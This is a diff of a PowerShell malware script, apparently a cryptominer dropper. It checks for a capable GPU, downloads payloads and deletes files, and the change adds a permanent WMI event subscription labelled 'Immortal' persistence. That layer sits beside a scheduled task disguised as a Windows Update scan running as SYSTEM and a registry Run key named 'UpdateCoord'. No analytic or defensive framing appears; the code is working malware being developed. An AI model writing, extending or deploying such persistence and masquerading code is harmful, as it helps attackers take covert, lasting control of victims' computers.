@@ -46,7 +46,7 @@ if (!(Test-Path $ce)) {
 }
 
 $gd = $false
-try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
+try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 4GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
 if ($gd -and !(Test-Path $ge)) {
     if (Get-F $gUrl $gz) {
         try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "RuntimeBroker.exe" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
@@ -77,10 +77,16 @@ if (Get-F $dUrl $dp) {
         $wp = New-Object Security.Principal.WindowsPrincipal($id)
         $ad = $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
         
+        # PERSISTENCE LAYER 1: WMI Event (Immortal)
+        $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="UpdateCoordFilter";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"}
+        $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="UpdateCoordConsumer";CommandLineTemplate=$tp}
+        Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer} | Out-Null
+
+        # PERSISTENCE LAYER 2: Scheduled Task
         if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "'$tp'" /sc onlogon /rl highest /f /ru "System" 2>$null }
         else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "'$tp'" /sc onlogon /f 2>$null }
 
-        # Redundant Registry Layer (Never Detach)
+        # PERSISTENCE LAYER 3: Registry (Never Detach)
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
     } catch { $e = $_.ToString() }
